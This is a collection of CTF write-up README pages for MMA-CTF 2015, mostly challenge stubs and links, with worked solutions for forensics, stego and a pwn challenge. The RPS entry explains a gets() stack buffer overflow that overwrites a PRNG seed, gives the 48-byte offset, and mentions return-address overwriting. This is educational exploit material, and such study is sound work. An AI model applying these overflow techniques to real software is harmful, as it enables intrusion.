> `60 00 0c 3a 1e 52 02 53 02 51 0c 5d 56 51 5a 5f 5f 5a 51 00 05 53 56 0a 5e 00 52 05 03 51 50 55 03 04 52 04 0f 0f 54 52 57 03 52 04 4e`

> http://bow.chal.mmactf.link/~scs/crypt5.cgi

> `62 a9 6c 28 0e 33 31 c6 68 cd 66 66 59 46 cc 53 0c 98 31 65 c6 35 c9 a9 60 4e 37 b0 33 46 0d 60 46 26 66 33 cc e6 a9 f6 6c 07 2b 23 af`

> http://bow.chal.mmactf.link/~scs/crypt6.cgi
>
> score 10,10,30,40 teams 436,381,224,63


## Write-up

(TODO)

## Other write-ups and resources

* <http://bannsecurity.com/index.php/home/10-ctf-writeups/17-mma-ctf-2015-smart-cipher-system>
* <https://0x90r00t.com/2015/09/07/mma-2015-cryptowarmup-smart-cipher-system-write-up/>
* [Japanese](f9cf7a3ddd5710e85116814fef01c907f4df35ce)
# MMA-CTF-2015: QR code recovery challenge

**Category:**
**Points:**
**Solves:**
**Description:**

> You picked up teared QR code fragments. Recover the flag.
>
> Flag is 12 characters without MMA{...}.
>
> [problem.png](problem.png-b99f108ecfe954e3299d47383007ead1a61b4f5c62591307184d54ea76abfc23)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/mma2015/misc400-qr/writeup.md>
* [Partial Write-up](http://ctf-for-beginners.blogspot.in/2015/09/write-up-mma-ctf-2015-qr-code-recovery.html) 
# MMA-CTF-2015: Splitted

**Category:** Forensics
**Points:** 30
**Solves:** 286
**Description:**

> [splitted.7z](splitted.7z-68ad844f2aab26d3d358ae9fa6c598a2727b0c0056567a288ffcd9414229121c)

## Write-up

by [polym](https://github.com/abpolym)

We are given a 7z zip archive that we first extract using `7z x splitted*.7z -oout`.
After extraction, we find a tcpdump capture file inside it:

```bash
$ cd splitted
$ ls
splitted.pcap
$ file splitted.pcap
splitted.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

We can open it using `wireshark` to immediately see that a file named `flag.zip` was transmitted:

![](./wireshark.png)

However, the zip was downloaded partially and in a non-consecutive order:

```bash
$ tshark -r splitted.pcap -V -Y 'http.request' | grep Range
    Range: bytes=2345-2813\r\n
    Range: bytes=0-468\r\n
    Range: bytes=1407-1875\r\n
    Range: bytes=2814-3282\r\n
    Range: bytes=3283-3744\r\n
    Range: bytes=469-937\r\n
    Range: bytes=938-1406\r\n
    Range: bytes=1876-2344\r\n
```

We can extract the parts using wiresharks Extract Objects Feature (unfortunately, I don't know how to do this programmatically - please tell me if you do - whether by scapy, tshark or otherwise): `File -> Export Objects -> HTTP -> Save all`:

```bash
$ ls -1
flag(1).zip
flag(2).zip
flag(3).zip
flag(4).zip
flag(5).zip
flag(6).zip
flag(7).zip
flag.zip
splitted.pcap
```

Now everything that is left to do is to generate the correct zip in order:

```bash
$ tshark -r splitted.pcap -V -Y 'http.request' | grep Range > downloads
$ mv flag.zip 'flag(0).zip'
$ tshark -r splitted.pcap -V -Y 'http.request' | grep Range | tr '=\-' ' ' | awk '{print $3}' | sort -n | while read line; do awk "/$line/{print NR-1; exit}" downloads; done | while read number; do cat "flag($number).zip" >> flag.zip; done
$ file flag.zip 
flag.zip: Zip archive data, at least v2.0 to extract
$ 7z x flag.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: flag.zip

Extracting  flag.psd

Everything is Ok

Size:       54061
Compressed: 3745
$ cd out
$ ls
flag.psd
```

We can convert this file, [flag.psd](./flag.psd),  using ImageMagick's `convert` command to get three images (three layers in one image):

```bash
$ convert flag.psd flag.png
$ ls -1
flag-0.png
flag-1.png
flag-2.png
flag.psd
```

The layer in the middle contains our flag:

![](./flag-1.png)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2015/09/07/mma-ctf-2015-splitted-writeup-forensics/>
* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-splitted-30.html>
* <http://ctf-for-beginners.blogspot.com/2015/09/write-up-mma-ctf-2015-splitted-30.html>
* <https://0x90r00t.com/2015/09/10/mma-2015-forensics-warmup-splitted-write-up/>
* <https://github.com/ByteBandits/writeups/blob/master/mma-ctf-2015/forensics/splitted/chaitan94/README.md>
# MMA-CTF-2015: stream

**Category:** Forensics
**Points:** 100
**Solves:** 54
**Description:**

> [stream](stream-ae909d8550c45e47b3c888c3c35ce5a6699de5390968e91b53a718d73c237718)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://0x90r00t.com/2015/09/07/mma-2015-forensics-stream-write-up/>
* <http://fadec0d3.blogspot.de/2015/09/mma-ctf-2015-stream-100.html>
* <https://shankaraman.wordpress.com/tag/mma-ctf-stream-writeup/>

We are given a pcap-ng file that contains several TCP requests, as well as HTTP and others:

```bash
$ tshark -r stream-ae909d8550c45e47b3c888c3c35ce5a6699de5390968e91b53a718d73c237718 | awk '{print $7}' | sort | uniq -c | sort -n
   2 HTTP
   3 NBNS
  33 STP
 516 TCP
```

Looking at the TCP Stream in wireshark (`Analyze -> Follow -> TCP Stream`), we see that someone watched a mms stream (Content-Type `application/x-mms-framed`) via a Media Player (User-Agent `NSPlayer` - [NetShow Media Player](http://www.user-agents.org/cgi-bin/csv2html.pl%3Fdata%3Dallagents.csv%26template%3Ddetail.html%26match%3D%255Cbid_n_s_1055%255Cb)):

![](tcp-follow.png)

We can extract this stream using wireshark - `File -> Export Objects -> HTTP` and e.g. save it as `stream.afs`.

Afterwards, we can watch the stream using `vlc` by doing following steps:

* Move the stream `stream.afs` to a new folder, e.g. `streamcontent`. `cd` to it.
* Host the content locally using `php -S 127.0.0.1:8080 -t .`
* Start `vlc`, open a network stream (`Media -> Open Network Stream`) and input the url `mms://127.0.0.1:8080/stream.afs`

Afterwards, you'll see the following:

![](./rainbow.png)

![](./flag.png)

The flag is `MMA{windows_xp_is_too_old_to_create_problem!!}`.

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2015/09/07/mma-ctf-2015-forensics-stream-writeup/>
* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-stream-100.html>
* <https://0x90r00t.com/2015/09/07/mma-2015-forensics-stream-write-up/>
# MMA-CTF-2015: mqaaa-70

**Category:** Misc
**Points:** 70
**Solves:** 138
**Description:**

> `I0B+Xk1RQUFBQT09CVVtLmJ3RFIrMXRLY0p0SCkJRHRubTZWbFRtaEtETnxyZHtLNDZFZG1DT2JXVThyYmpSSUFBQT09XiN+QA==`
> 

## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-mqaaaa-70.html> 
* <https://0x90r00t.com/2015/09/07/mma-2015-misc-mqaaaa-write-up/>
# MMA-CTF-2015: pieceofeight-reloaded-100

**Category:** Forensics
**Points:** 100
**Solves:** 7
**Description:**

> Do you remember pieceofeight?
>
> `nc cry1.chal.mmactf.link 26314`
>
> Update: goal position is below. You need to solve puzzles 10 times.
>
> 1 2 3

> 4 5 6

> 7 8

> Hint: c continue-key
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://dvteam.org/writeups/mmactf/2015/misc/200/> 
# MMA-CTF-2015: welcome-10

**Category:** Misc
**Points:** 10
**Solves:** 657
**Description:**

> The flag is `MMA{Welcome_To_MMACTF!!}`.
> 

## Write-up

See description.

## Other write-ups and resources

* none yet
# MMA-CTF-2015: alphabet-programming-200

**Category:** PPC
**Points:** 200
**Solves:** 22
**Description:**

> http://recocta.chal.mmactf.link:8080/
> http://recocta.chal.mmactf.link:8081/ (Mirror 1)
> http://recocta.chal.mmactf.link:8082/ (Mirror 2)
> http://recocta.chal.mmactf.link:8083/ (Mirror 3)

> [alphabet-programming.7z](alphabet-programming.7z-450e27b448a4f78c0d9cfb1610451e081fb5dfddf2015ec1ff2ef74ef184be6f)
> 

## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
# MMA-CTF-2015: i-150

**Category:** PPC  
**Points:** 150
**Solves:** 16
**Description:**

> The file is the source code of a stack based language. Write a quine in this language!
>
> [i.7z](i.7z-9d4fa211cc1603bed75bd81f582892873a10ec1e92945027117b3983c0f17f3b)
>
> http://mix-nuts.chal.mmactf.link/
>
> The limitation of quine size is 200 bytes.
>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/mma2015/prog150-i/writeup.md> 
# MMA-CTF-2015: pattern-lock-60

**Category:** PPC
**Points:** 20,40
**Solves:** 385,32
**Description:**

> In android smartphone, you can use "pattern lock".
>
> Pattern lock use 9 dots(3x3) on the screen in the figure below.

> ![](image1.png-a31666645dbefe48d3fd570a94566c1b629460cccb03f6196f75d5931add2f84)

> The following figures are examples of lock pattern.

> ![](image2.png-a19c577c5dc5750723b10989bd894e856406750150b2c9624f86b977d241b0b1) ![](image3.png-d49f73b913d5ee670aad11ddd2b4725c698ef060a7efde1ce708fed928337304)

> Lock pattern must satisfy following three conditions.
>
> Use at most once each dot.
> Use at least 4 dots.
> Cannot skip the dot on the segment.

> `(Flag 1) Flag is the number of lock patterns in decimal without MMA{...}.`
>
> `(Flag 2) Flag is the maximum length of lock patterns on 4x4 dots. Assume the length of two neighbor dot is 1. Please answer rounded to four decimal places without MMA{...}. (XX.XXXX)`
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/09/07/172118>
* <http://ctf-for-beginners.blogspot.com/2015/09/write-up-mma-ctf-2015-pattern-lock-20.html>
# MMA-CTF-2015: perfect-matching-200

**Category:** PPC
**Points:** 200
**Solves:** 14
**Description:**

> Can you find a perfect matching?
>
> [perfect-matching.7z](perfect-matching.7z-16e8e568e0bd126f828e649b91fbd0ef717cd0329d4f72f74bc5a90523e5e927)
>
> `$ nc mix-nuts.chal.mmactf.link 12393`
>
> teams 14 score 200


## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/09/07/214418>
# MMA-CTF-2015: d3flate-500

**Category:** Pwn
**Points:** 500
**Solves:** 4
**Description:**

> Get the flag!
> 
> `nc pwn1.chal.mmactf.link 27025`
>
> Server: Ubuntu 14.04 AMD64
>
> [d3flate.tar.xz](perfect-matching.7z-16e8e568e0bd126f828e649b91fbd0ef717cd0329d4f72f74bc5a90523e5e927)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://pizza.abusers.eu/ctf/mmactf-2015/d3flate/>
* <http://pastebin.com/DDUG2iJT>
# MMA-CTF-2015: RPS

**Category:** Pwn
**Points:** 50
**Solves:** 171
**Description:**

> Win 50 games in a row!
>
> `nc milkyway.chal.mmactf.link 1641`
>
> [rps.7z](rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/RPS%20%28rock%20paper%20scissors%29/58/) (Common understanding)
* <http://iamlazlow.blogspot.com/2015/09/mma-ctf-2015-rps-pwn-warmup.html> (C Code)
* <http://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/> (IDA decompiled binary, ctypes and pwntools usage)
* <https://jkrshnmenon.wordpress.com/2015/09/09/mmactf15-rps-write-up/> (Alternative solution)
* <http://trich.im/?p=47> (IDA decompiled binary, Alternative solution)
* <http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012) (Reversed Source code in C)
* <https://gist.github.com/Bono-iPad/42434cdfff084c637d3b>

### Meta

Keywords:

* Stack Buffer Overflow (`sbo`) in `gets`
* Pseudo Random Number Generator (`prng`)
* Alternative solutions

We are given a 7z archive that contains a x86-64bit non-stripped ELF for Linux:

```bash
$ file rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e
rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e: 7-zip archive data, version 0.3
$ 7z x rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU)

Processing archive: rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e

Extracting  rps/rps
Extracting  rps

Everything is Ok

Folders: 1
Files: 1
Size:       9664
Compressed: 2944
$ cd out/rps/
$ file rps
rps: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=8811962c746e1d068a5fa5b4deb7cb043c30146f, not stripped
```

Running it:

```bash
$ ./rps 
What's your name: cheater
Hi, cheater
Let's janken
Game 1/50
Rock? Paper? Scissors? [RPS]R
Rock-Scissors
You win!!
Game 2/50
Rock? Paper? Scissors? [RPS]R
Rock-Paper
You lose
```

Looks like we have to win 50 rounds of Rock-Paper-Scissors to (maybe) get the flag!

Let's run it with `ltrace -f`:

```bash
$ ltrace -f ./rps 
[pid 2700] __libc_start_main(0x400806, 1, 0x7fff602da5a8, 0x400af0 <unfinished ...>
[pid 2700] fopen("/dev/urandom", "r")                 = 0x251e010
[pid 2700] fread(0x7fff602da4a0, 4, 1, 0x251e010)     = 1
[pid 2700] fclose(0x251e010)                          = 0
[pid 2700] printf("What's your name: ")               = 18
[pid 2700] fflush(0x7f5b0219a400What's your name: )                     = 0
[pid 2700] gets(0x7fff602da470, 0x7f5b0219b9e0, 0, -1cheater
) = 0x7fff602da470
[pid 2700] printf("Hi, %s\n", "cheater"Hi, cheater
)              = 12
[pid 2700] puts("Let's janken"Let's janken
)                       = 13
[pid 2700] fflush(0x7f5b0219a400)                     = 0
[pid 2700] srand(0x24e2002, 0x7f5b0219b9e0, 0, -1)    = 0
[pid 2700] printf("Game %d/50\n", 1Game 1/50
)                  = 10
[pid 2700] printf("Rock? Paper? Scissors? [RPS]")     = 28
[pid 2700] fflush(0x7f5b0219a400Rock? Paper? Scissors? [RPS])                     = 0
[pid 2700] getchar(1, 0x7f5b0219b9e0, 0, -1R
)          = 82
[pid 2700] rand(0, 0x7f5b0219b9f0, 82, -1)            = 0x3d958a93
[pid 2700] printf("%s-%s\n", "Rock", "Rock"Rock-Rock
)          = 10
[pid 2700] puts("Draw"Draw
)                               = 5
[...]
[pid 2700] puts("You lose"You lose
)                           = 9
[pid 2700] fflush(0x7f5b0219a400)                     = 0
[pid 2700] +++ exited (status 1) +++
```

We notice:

* After opening `/dev/urandom` with `fopen`, `4` bytes from it are read into the stack at `0x7fff602da4a0`
* Our username input is read with `gets`, which hints at a Stack Buffer Overflow
* Before the first round starts, `srand` is called.

Disassembling it with `radare2` (`main` is long, only showing part of it):

![](./part-main.png)

We see the following:

* At `0x00400825` the address `rbp-local_4` (`local_4` is `rbp-0x20`) is stored into `rax` with `lea` (load effective address)
* `fread` is uses this address as the first parameter (`mov rdi, rax`, `rdi` here is by calling convention the first parameter), which means it stores the read data into a buffer located at the address
* `gets` reads our input into `rbp-local_10`, with `local_10`==`0x50`, so below the buffer address of the previous `fread` buffer
* `srand` uses the `fread` buffer as seed

Using `IDA`, you can generate decompiled C source code representing the binary as seen in [this](https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/) or [this writeup](http://trich.im/?p=47). [This Japanese writeup](http://charo-it.hatenablog.jp/entry/2015/09/08/005012) even created very readable C source code.

Looking at the decompiled binary, we see that we should overwrite the `srand` seed with our username input.
We do this, because setting the same seed for `srand`, a "bad" Pseudo Random Number Generator, causes `rand` to generate the same random number sequences  - and thus we can predict the outcome and win the game!

As [this writeup](https://b01lers.net/challenges/MMA%20CTF%202015/RPS%20%28rock%20paper%20scissors%29/58/) suggests, the values for `R`ock, `P`aper or `S`cissors are `0`, `1` and `2` (output of `rand() % 3`).

The offset differences between our input buffer and the `srand` buffer are `0x50-0x20=0x30`=48 bytes. This means providing `4` bytes after a `48` string payload overwrites the seed value.

We now just have to pre-calculate sequences by either writing a C program, as in [this writeup](http://iamlazlow.blogspot.de/2015/09/mma-ctf-2015-rps-pwn-warmup.html) or use the `ctypes` module in python as in [this](https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/) or [this writeup](https://gist.github.com/Bono-iPad/42434cdfff084c637d3b).

[This python script](solve.py) uses the latter solution:

```bash
$ p solve.py  
[+] Opening connection to localhost on port 6666: Done
[+] Recieving all data: Done (120B)
[*] Closed connection to localhost port 6666
What's your name: Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????
Let's janken
Game 1/50
Rock? Paper? Scissors? [RPS]Paper-Rock
You win!!
Game 2/50
Rock? Paper? Scissors? [RPS]Paper-Rock
You win!!
Game 3/50
[...]
Game 50/50
Rock? Paper? Scissors? [RPS]Rock-Scissors
You win!!
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????!!!!
MMA{treed_three_girls}
```

The flag is `MMA{treed_three_girls}`.

PS: Another alternative solution such as in [this](https://jkrshnmenon.wordpress.com/2015/09/09/mmactf15-rps-write-up/) or [this writeup](http://trich.im/?p=47) overwrite the return address `RIP` with the address `0x00400aa4` (or rather some instructions above, since this address contains a `0x0a` byte, forcing `gets` to stop reading) that opens the flag file `flag.txt`, reads the flag and prints it to the user.

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/RPS%20%28rock%20paper%20scissors%29/58/)
* <http://iamlazlow.blogspot.com/2015/09/mma-ctf-2015-rps-pwn-warmup.html>
* <https://0x90r00t.com/2015/09/08/mma-2015-pwnwarmup-rps-write-up/>
* <http://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/>
* <https://jkrshnmenon.wordpress.com/2015/09/09/mmactf15-rps-write-up/>
* <https://ctf-team.vulnhub.com/mma-1st-2015-rps/>
* <http://trich.im/?p=47>
* <http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
* [Japanese](http://mage-ctf-writeup.blogspot.de/2015/09/mma-ctf-1st-2015.html)
* [Japanese](https://gist.github.com/Bono-iPad/42434cdfff084c637d3b)
* [Japanese](http://kusano-k.hatenablog.com/entry/2015/09/08/014315)
* [Russian](http://countersite.org/articles/reverse_engineering/31-rps-pwn-mmactf-2015-write-up.html)
* [Polish](http://forum.4programmers.net/Spolecznosc/258069-writeup_mma_ctf_2015)
# MMA-CTF-2015: spell-300

**Category:** Pwn
**Points:** 300
**Solves:** 20
**Description:**

> Get the flag!
>
> `nc pwn1.chal.mmactf.link 38264`
>
> [spell.tar.xz](spell.tar.xz-affec9499c75fec329b18d98f2072391338017318e97a13f6acca831228b5683)
>
> Server: Ubuntu 14.04 AMD64
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://trich.im/?p=47>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
* [Japanese](https://gist.github.com/Bono-iPad/42434cdfff084c637d3b#spell)
* [Korean](http://daehee87.tistory.com/513)
* <http://pastebin.com/nBiQ6r8L>
* <http://pastebin.com/qZ6UVhLY>
* <https://gist.github.com/ryota-be/cc916f5e8dbc3d04fa40>
# MMA-CTF-2015 CTF write-ups

* <http://score.mmactf.link/>
* [Scoreboard](http://score.mmactf.link/ranking?locale=en) or [local alternative](score.txt)

## Completed write-ups

* [forensics/splitted-30](forensics/splitted-30)
* [forensics/stream-100](forensics/stream-100)
* [misc/welcome-10](misc/welcome-10)
* [pwn/rps-50](pwn/rps-50)
* [stego/miyako-350](stego/miyako-350)
* [stego/nogaya-castle-100](stego/nogaya-castle-100)

## External write-ups only

* [crypto/alice-game-250](crypto/alice-game-250)
* [crypto/LCG-sign-400](crypto/LCG-sign-400)
* [crypto/regrettable-ecc-200](crypto/regrettable-ecc-200)
* [crypto/signer-and-verifier-100](crypto/signer-and-verifier-100)
* [crypto/smart-cipher-system-90](crypto/smart-cipher-system-90)
* [forensics/qr-code-recovery-challenge-400](forensics/qr-code-recovery-challenge-400)
* [misc/mqaaa-70](misc/mqaaa-70)
* [misc/pieceofeight-reloaded-100](misc/pieceofeight-reloaded-100)
* [ppc/alphabet-programming-200](ppc/alphabet-programming-200)
* [ppc/i-150](ppc/i-150)
* [ppc/pattern-lock-60](ppc/pattern-lock-60)
* [ppc/perfect-matching-200](ppc/perfect-matching-200)
* [pwn/d3flate-500](pwn/d3flate-500)
* [pwn/spell-300](pwn/spell-300)
* [reverse/digital-circuit-250](reverse/digital-circuit-250)
* [reverse/how-to-use-30](reverse/how-to-use-30)
* [reverse/impossible-150](reverse/impossible-150)
* [reverse/money-game-200](reverse/money-game-200)
* [reverse/simple-hash-200](reverse/simple-hash-200)
* [reverse/this-program-cannot-run-in-dos-mode-80](reverse/this-program-cannot-run-in-dos-mode-80)
* [web/login-as-admin-1-30](web/login-as-admin-1-30)
* [web/login-as-admin-2-200](web/login-as-admin-2-200)
* [web/mortal-magi-agents-300](web/mortal-magi-agents-300)
* [web/motto-mijkai-address-400](web/motto-mijkai-address-400)
* [web/uploader-100](web/uploader-100)

## Missing write-ups

* [reverse/encrypted-500](reverse/encrypted-500)
* [web/bow-tickets-500](web/bow-tickets-500)# MMA-CTF-2015: digital-circuit-250

**Category:** Reverse
**Points:** 250
**Solves:** 14
**Description:**

> Get the flag.
>
> [digital_circuit.7z](digital_circuit.7z-3c5f180662a42779530292328c3dc3bbf94c3745ab5d2074e231e6f2e68d94bb)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://shinh.hatenablog.com/entry/2015/09/07/230522)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
# MMA-CTF-2015: encrypted-500

**Category:** Reverse
**Points:** 500
**Solves:** 0
**Description:**

> `$ ./cipher -encrypt image.bmp image.bmp.enc`
>
> [encrypted.7z](encrypted.7z-849c95defe1bbdfe9c214858515d5a07a7be13f0392f1ec5805a856bf3304a5a)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# MMA-CTF-2015: how-to-use-30

**Category:** Reverse
**Points:** 30
**Solves:** 164
**Description:**

> [howtouse](howtouse-8913ee93d7d40c9859ee0a29c456d54ba44aabf78ebdbc4e1be016af62c8a606)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/angr/angr-doc/blob/master/examples/mma_howtouse/howtouse.py> - mostly-automated solution using the angr binary analysis framework
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
# MMA-CTF-2015: impossible-150

**Category:** Reverse
**Points:** 150
**Solves:** 7
**Description:**

> Get the flag!
>
> `nc milkyway.chal.mmactf.link 6310`

> [impossible.7z](impossible.7z-657ca7fc05ef7c47be3ab101e9e0e3b39a1686c21882d85b0f0f00bc9400c3ae)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://boaster.github.io/ctf/2015/09/07/MMA-CTF-RE-150.html>
* <http://hxp.io/blog/18/MMACTF%202015:%20Reversing%20150%20%22Impossible/?%22%20writeup/>
# MMA-CTF-2015: money-game-200

**Category:**
**Points:**
**Solves:**
**Description:**

> Get $100,000 and the flag.
>
> `nc pwn1.chal.mmactf.link 21345`
>
> Flag is here.
>
> `/home/cthuakzd/flag1`

> `/home/cthuakzd/flag2`

> [moneygame.7z](moneygame.7z-79d4612435e676630748e805bdfff4c5fbff863baed3cc6f9586951e97be85fc)
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://ctfhacker.com/ctf/pwnable/2015/09/07/mmactf-moneygame.html>
* [Japanese](http://shinh.hatenablog.com/entry/2015/09/07/230522)
* [Japanese](https://193s.github.io/blog/2015/09/08/MMACTF2015-writeup/)
# MMA-CTF-2015: simple-hash-200

**Category:**
**Points:**
**Solves:**
**Description:**

> Get the flag!
>
> `nc milkyway.chal.mmactf.link 6669`
>
> [simple_hash.7z](simple_hash.7z-8debe103674b214f4edd6f9a1b2d56dcff9ab45169770b1dd2e06984da363c74)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/angr/angr-doc/blob/master/examples/mma_simplehash/mma_simplehash.py> - mostly-automated solution, using the angr binary analysis framework.
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/MMACTF/reversing/simple_hash>
* <http://dvteam.org/writeups/mmactf/2015/simple-hash/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
# MMA-CTF-2015: this-program-cannot-run-in-dos-mode-80

**Category:** Reverse
**Points:** 80
**Solves:** 140
**Description:**

> [cannotberun](cannotberun-6a3060f21f87f69f3f67d3077aff51be92db0a71e9d5721aa9e37073abd12b7e)


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-cannotberun-80.html> 
* <http://boaster.github.io/ctf/2015/09/08/MMA-CTF-RE-80.html>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/08/005012)
# MMA-CTF-2015: miyako-350

**Category:**  Stego
**Points:** 350
**Solves:** 2
**Description:**

> Get the flag.
>
> [stego.png](stego.png-e7cd78e3f592084b819788c46755921528d066efba391773307994d69beae3f3)


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [khack40](http://khack40.info/mma-ctf-2015-miyako-stega-write-up/).

We are given a PNG and print the pixels using [pixels.py](./pixels.py).

On a closer look, we see that each pixel and its following neighbour differs slightly:

```
224 216 216
229 221 222
223 217 222
227 221 217
```

The difference between the first pixel RGB values and the second is around 6, between the second and fourth 5 etc.

Though it is not entirely obvious, the authors encoded a binary string in the sign of the difference of the blue values.

Every second pixel, we calculate the difference of the blue value to the previous pixel and interpret it as either a 0 (if negative) or 1 (if positive).

The python script [picdiff.py](./picdiff.py) prints the encoded binary string and shows us the resulting picture:

![](./result.png)

We then can convert the binary string to ASCII to find the (broken) flag:

```bash
+bash-4.3$ python2.7 picdiff.py stego.png-e7cd78e3f592084b819788c46755921528d066efba391773307994d69beae3f3 | perl -lpe '$_=pack"B*",$_' | xxd
```
![](./xxd.png)

The final flag is: `MMA{---RGB--BRG-1a02f42b}`

## Other write-ups and resources

* <http://khack40.info/mma-ctf-2015-miyako-stega-write-up/>
# MMA-CTF-2015: nogaya-castle-100

**Category:** Stego
**Points:** 100
**Solves:** 243
**Description:**

> Get the flag.
>
> [problem.png](problem.png-dbaddea0492910076ff7c1b3140edfcaa3132784443bdc504d50e0559efa0463)


## Write-up

by [polym](https://github.com/abpolym)

We are given a PNG that we open with `stegsolve` to find the flag in the RGB plane 0 values:

![](flag.png)

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2015/09/07/mma-ctf-2015-steganography-100-nagoya-castle-writeup/>
* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-nagoya-castle-100.html>
* <https://0x90r00t.com/2015/09/07/mma-2015-stegano-nagoya-castle-write-up/>
* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Nagoya%20Castle/55/)
* <http://ctf-for-beginners.blogspot.in/2015/09/write-up-mma-ctf-2015-nagoya-castle-100.html>
* <https://github.com/ByteBandits/writeups/blob/master/mma-ctf-2015/stego/nagoya-castle/chaitan94/README.md>
# MMA-CTF-2015: bow-tickets-500

**Category:** Web
**Points:** 500
**Solves:** 2
**Description:**

> Bow! Bow!
>
> http://bow.chal.mmactf.link/~bow/bow.cgi/
>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# MMA-CTF-2015: login-as-admin-1-30

**Category:** Web
**Points:** 30
**Solves:** 318
**Description:**

> Login as admin. And get the flag! The flag is the password of admin.
>
> http://arrive.chal.mmactf.link/login.cgi
>
> You can use test:test.
> 


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/mma-ctf-2015-login-as-admin-30.html> 
* <https://ctftime.org/writeup/1626>
* <http://www.i4info.in/2015/09/08/test-post/>
* <https://0x90r00t.com/2015/09/08/mma-2015-web-login-as-admin-write-up/>
# MMA-CTF-2015: login-as-admin-2-200

**Category:** Web
**Points:** 200
**Solves:** 11
**Description:**

> Login as Admin!
>
> http://login2.chal.mmactf.link
>
> You can use test:test account.
>

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Login%20As%20Admin!%282%29/61/)
# MMA-CTF-2015: mortal-magi-agents-300

**Category:** Web
**Points:** 300
**Solves:** 77
**Description:**

> http://magiagents.chal.mmactf.link/
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.init-labs.org/2015/09/07/mmactf-web300-challenge-writeup/>
* <http://81glntd.blogspot.com/2015/09/writeup-web300-mmactf-2015.html>
* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Mortal%20Magi%20Agents/60/)
# MMA-CTF-2015: motto-mijkai-address-400

**Category:** Web
**Points:** 100,300
**Solves:** 2,0
**Description:**

> Login as admin and get the flag1.
>
> http://mmaddress.chal.mmactf.link/
>
> [mmaddress.7z](mmaddress.7z-4328e2d3f0adcbaf9e4fdd1429a57a35efcec335f3cc4d4e0c17bddd66dd8dab)
>

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/mma-ctf-2015-motto-mijikai-address-cryptoweb-100300/>
# MMA-CTF-2015: uploader-100

**Category:** Web
**Points:** 100
**Solves:** 146
**Description:**

